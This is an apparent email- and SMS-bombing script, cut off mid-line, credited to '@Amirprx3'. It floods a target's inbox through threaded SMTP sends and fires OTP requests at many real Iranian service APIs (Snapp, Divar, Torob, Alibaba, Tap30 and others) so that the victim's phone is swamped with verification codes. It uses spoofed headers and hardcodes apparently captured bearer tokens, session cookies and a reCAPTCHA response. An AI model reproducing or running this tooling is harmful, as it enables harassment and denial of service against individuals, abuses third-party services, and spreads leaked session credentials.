from platform import node, system, release; Node, System, Release = node(), system(), release()
from os import system, name; system('clear' if name == 'posix' else 'cls')
from re import match, sub
from threading import Thread
import urllib3; urllib3.disable_warnings()
from time import sleep
import smtplib
from email.mime.text import MIMEText
import random
import sys
import socket
from fake_useragent import UserAgent

ua = UserAgent()
# MadeBy: @Amirprx3
try:
    from requests import get, post
except ImportError:
    system("python3 -m pip install requests")

try:
    from requests import get, post
except ImportError:
    system("python3 -m pip install fake_useragent")

# Colors
r = '\033[31;1m'  # Red
g = '\033[32;1m'  # Green
y = '\033[33;1m'  # Yellow
b = '\033[34;1m'  # Blue
p = '\033[35;1m'  # Purple
w = '\033[37;1m'  # White
a = '\033[0m'     # Reset
d = '\033[90;1m'  # Dark Gray

# Slow print function
def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# Progress bar function (for email only)
def progress_bar(progress, total, width=30):
    percent = int((progress / total) * 100)
    filled = int(width * progress // total)
    bar = f"{g}█{a}" * filled + f"{r}-{a}" * (width - filled)
    sys.stdout.write(f"\r{p}[Progress] {y}{percent}% {w}[{bar}]")
    sys.stdout.flush()

# Check internet connectivity
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# Random email messages list
random_messages = [
    "Hello! This is a test message from the Hacker group. Hope you're having a great day!",
    "Hey there! Just dropping by to say hi from our tool.",
    "This is an automated message to test our system. Please ignore it!",
    "Hi friend, this is a random message to check your email.",
    "Good news! Our tool is working, and this message is proof.",
]

# Email sending function (no debug logs)
def send_email(target_email, sender_email, sender_password, smtp_server="smtp.gmail.com", smtp_port=587, retries=3):
    for attempt in range(retries):
        try:
            body = random.choice(random_messages)
            msg = MIMEText(body)
            msg['Subject'] = f"Test Message #{random.randint(1, 1000)}"
            msg['From'] = f"Hacker group <{sender_email}>"
            msg['To'] = target_email
            msg['Reply-To'] = sender_email
            msg['X-Priority'] = '3'
            msg['X-Mailer'] = 'Hacker Mailer v2.0'
            
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
            server.set_debuglevel(0)  # Disable debug logs
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, target_email, msg.as_string())
            server.quit()
            return True
        except Exception as e:
            if attempt < retries - 1:
                sleep(2)
            else:
                print(f"{r}[Email Error] {a}Failed after {retries} attempts: {e}")
                return False

# Email bomber function with progress bar and menu return
def email_bomber(target_email, sender_email, sender_password, count, delay):
    if not check_internet():
        print_slow(f"{r}[-] {y}No internet connection! Please check your network and try again.")
        sleep(2)
        return
    
    print_slow(f"{p}╔═════[ Email Bombing Initiated ]═════╗")
    print_slow(f"{g}Target Locked: {y}{target_email}")
    print_slow(f"{g}Payloads: {y}{count} emails")
    print_slow(f"{g}Delay: {y}{delay}s")
    print_slow(f"{p}╚═════════════════════════════════════╝")
    sleep(1)

    for i in range(count):
        try:
            Thread(target=send_email, args=(target_email, sender_email, sender_password)).start()
            progress_bar(i + 1, count)
            sys.stdout.write(f" {b}[+] {y}Payload {i+1}/{count} Deployed!\n")
            sys.stdout.flush()
            sleep(delay)
        except KeyboardInterrupt:
            print_slow(f"{r}[-] {y}Bombing Terminated by User!")
            break
    
    print_slow(f"{g}[+] {y}Mission Completed!")
    sleep(1)  # Brief pause before clearing
    system('clear' if name == 'posix' else 'cls')  # Clear screen before returning

# SMS sending functions (placeholders)
def snap(phone):
    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": ua.random, "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone":phone}
    try:
        snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
        if "OK" in snapR:
            print(f'{g}(Snap) {a}Code Was Sent')
            return True #snapp
    except:
        pass

def gap(phone):
    gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": ua.random,"appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
    try:
        gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH).text
        if "OK" in gapR:
            print(f'{g}(Gap) {a}Code Was Sent')
            return True #gap     
    except:
        pass

def tap30(phone):
    tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": ua.random,"content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        tap30R = post(timeout=5, url="https://tap33.me/api/v2/user", headers=tap30H, json=tap30D).json()
        if tap30R['result'] == "OK":
            print(f'{g}(Tap30) {a}Code Was Sent')
            return True #tapsi
    except:
        pass
    
def divar(phone):
    divarH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://divar.ir',
'referer': 'https://divar.ir/',
'user-agent': ua.random,
'x-standard-divar-error': 'true'}
    divarD = {"phone":phone.split("+98")[1]}
    try:
        divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD).json()
        if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            print(f'{g}(Divar) {a}Code Was Sent')
            return True #divar api
    except:
        pass
    
def torob(phone):
    phone = '0'+phone.split('+98')[1]
    torobH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cookie': 'abtest=next_pwa; search_session=ofwjiyqqethomevqrgzxvopjtgkgimdc; _gcl_au=1.1.805505755.1639260830; _gid=GA1.2.683761449.1639260830; _gat_UA-105982196-1=1; _ga_CF4KGKM3PG=GS1.1.1639260830.1.0.1639260830.0; _clck=130ifw1|1|ex6|0; _ga=GA1.2.30224238.1639260830',
'origin': 'https://torob.com',
'referer': 'https://torob.com/',
'user-agent': ua.random
}
    try:
        torobR = get(timeout=5, url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}", headers=torobH).json()
        if torobR["message"] == "pin code sent":
            print(f'{g}(Torob) {a}Code Was Sent')
            return True # torob
    except:
        pass

def snapfood(phone):
    sfoodU = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa'
    sfoodH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'UUID=39c62f64-3d2d-4954-9033-816098559ae4; location={"id":"","latitude":"-1.000","longitude":"-1.000","mode":"Auto"}; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BRQfjyp1DGE7w6o2UXNZHyc7XXXwZB6%2B4%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FKNDbZLoR2s9fxetSEbovoXrW2OyagTvcRyyfS%2BiAq3Wo0gtPlB2mt5jezOT0RcCuwOIS0v8tUKw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2Bxvj2aS9mFuxvX6rDEMIsAuRecCyMypTk%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2B8so%2F5rMdojUEEuG%2BVwFrtXzXNtpojE10%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2FUIoTuPIMvAKRiGcEmnsfog8TvprQ8QJI%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FOaB1OTIgZSuGfv6Ov271AcX0ZKQWg94ey1fyJ%2Fv%2B2H09dia3Z%2BMvi; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19W4bPJRR7lbNo2fIWRB3Gk2GDkBYASrB7u755JxTnymjQ4j%2BjxgRx0; jwt-refresh_token=undefined; jwt-token_type=Bearer; jwt-expires_in=2678399; jwt-access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ; crisp-client%2Fsession%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=session_69ff5918-b549-4c78-89fd-b851ca35bdf6; crisp-client%2Fsocket%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=0',
'origin': 'https://snappfood.ir',
'referer': 'https://snappfood.ir/',
'user-agent': ua.random
}
    sfoodD = {"cellphone": "0"+phone.split("+98")[1]}
    try:
        sfoodR = post(timeout=5, url=sfoodU, headers=sfoodH, data=sfoodD).json()
        if sfoodR['status'] == True:
            print(f'{g}(SnapFood) {a}Code Was Sent')
            return True # snapp food
    except:
        pass
    
def sheypoor(phone):
    sheyporH = {"Host": "www.sheypoor.com","User-Agent": ua.random, "Accept": "*/*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Content-Length": "62","Origin": "https://www.sheypoor.com","Connection": "keep-alive","Referer": "https://www.sheypoor.com/session","Cookie": "plog=False; _lba=false; AMP_TOKEN=%24NOT_FOUND; ts=46f5e500c49277a72f267de92dd51238; track_id=22f97cea33f34e368e4b3edd23afd391; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=3f475c6e-f55b-0d29-de67-6cdc46bc6592; analytics_token=3cce634d-040a-baf3-fdd6-552578d672df; yektanet_session_last_activity=8/13/2020; _yngt=0bc37b56-6478-488b-c801-521f101259fd; _lbsa=false; _ga=GA1.2.1464689488.1597346921; _gid=GA1.2.1551213293.1597346921; _gat=1","TE": "Trailers"}
    sheyporD = {"username" : "0"+phone.split("+98")[1]}
    try:
        sheyporR = post(timeout=5, url='https://www.sheypoor.com/auth', headers=sheyporH, data=sheyporD).json()
        if sheyporR['success'] == True:
            print(f'{g}(Sheypoor) {a}Code Was Sent')
            return True # Sheypoor
    except:
        pass

def okorosh(phone):
    okJ = {
    "mobile": "0"+phone.split("+98")[1],
    "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"
}
    okU = 'https://my.okcs.com/api/check-mobile'
    okH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/json;charset=UTF-8',
'cookie': '_ga=GA1.2.1201761975.1639324247; XSRF-TOKEN=eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0%3D; myokcs_session=eyJpdiI6InlYaXBiTUw1dHFKM05rN0psNjlwWXc9PSIsInZhbHVlIjoiNDg1QWJQcGwvT3NUOS9JU1dSZGk2K2JkVlNVV2wrQWxvWGVEc0d1MDR1aTNqVSs4Z0llSDliMW04ZFpGTFBUOG82NEJNMVFmTmNhcFpzQmJVTkpQZzVaUEtkSnFFSHU0RFprcXhWZlY0Zit2UHpoaVhLNXdmdUZYN1RwTnVLUFoiLCJtYWMiOiI5NTUwMmI2NDhkNWJjNDgwOGNmZjQxYTI4YjA0OTFjNTQ5NDc0YWJiOWIwZmI4MTViMWM0NDA4OGY5NGNhOGIzIn0%3D',
'origin': 'https://my.okcs.com',
'referer': 'https://my.okcs.com/',
'user-agent': ua.random,
'x-requested-with': 'XMLHttpRequest',
'x-xsrf-token': 'eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0='}
    try:
        okR = post(timeout=5, url=okU, headers=okH, json=okJ).text
        if 'success' in okR:
            print(f'{g}(OfoghKourosh) {a}Code Was Sent')
            return True #OfoghKourosh
    except:
        pass
    
def alibaba(phone):
    alibabaH = {"Host": "ws.alibaba.ir","User-Agent": ua.random,"Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR","ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy","Content-Type": "application/json;charset=utf-8","Content-Length": "29","Origin": "https://www.alibaba.ir","Connection": "keep-alive","Referer": "https://www.alibaba.ir/hotel"}
    alibabaD = {"phoneNumber":"0"+phone.split("+98")[1]}
    try:
        alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json=alibabaD ).json()
        if alibabaR["result"]["success"] == True:
            print(f'{g}(AliBaba) {a}Code Was Sent')
            return True
    except:
        pass

def smarket(phone):
    smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+98")[1]}'
    smarketH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'text/plain;charset=UTF-8',
'origin': 'https://snapp.market',
'referer': 'https://snapp.market/',
'user-agent': ua.random}
    try:
        smarketR = post(timeout=5, url=smarketU, headers=smarketH).json()
        if smarketR['status'] == True:
            print(f'{g}(SnapMarket) {a}Code Was Sent')
            return True #SnapMarket
    except:
        pass
    
def gapfilm(phone):
    gaJ = {
    "Type": 3,
    "Username": phone.split("+98")[1],
    "SourceChannel": "GF_WebSite",
    "SourcePlatform": "desktop",
    "SourcePlatformAgentType": "Opera",
    "SourcePlatformVersion": "82.0.4227.33",
    "GiftCode": None
}
    gaU = 'https://core.gapfilm.ir/api/v3.1/Account/Login'
    gaH = {'Accept': 'application/json, text/plain, */*',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'fa',
'Browser': 'Opera',
'BrowserVersion': '82.0.4227.33',
'Connection': 'keep-alive',
'Content-Type': 'application/json',
'Host': 'core.gapfilm.ir',
'IP': '185.156.172.170',
'Origin': 'https://www.gapfilm.ir',
'OS': 'Linux',
'Referer': 'https://www.gapfilm.ir/',
'SourceChannel': 'GF_WebSite',
'User-Agent': ua.random}
    try:
        gaR = post(timeout=5, url=gaU, headers=gaH, json=gaJ).json()
        if gaR['Code'] == 1:
            print(f'{g}(GapFilm) {a}Code Was Sent')
            return True
    except:
        pass
# MadeBy: @Amirprx3
def sTrip(phone):
    sTripH = {"Host": "www.snapptrip.com","User-Agent": ua.random,"Accept": "*/*","Accept-Language": "fa","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/json; charset=utf-8","lang": "fa","X-Requested-With": "XMLHttpRequest","Content-Length": "134","Origin": "https://www.snapptrip.com","Connection": "keep-alive","Referer": "https://www.snapptrip.com/","Cookie": "route=1597937159.144.57.429702; unique-cookie=KViXnCmpkTwY7rY; appid=g*-**-*; ptpsession=g--196189383312301530; _ga=GA1.2.118271034.1597937174; _ga_G8HW6QM8FZ=GS1.1.1597937169.1.0.1597937169.60; _gid=GA1.2.561928072.1597937182; _gat_UA-107687430-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; 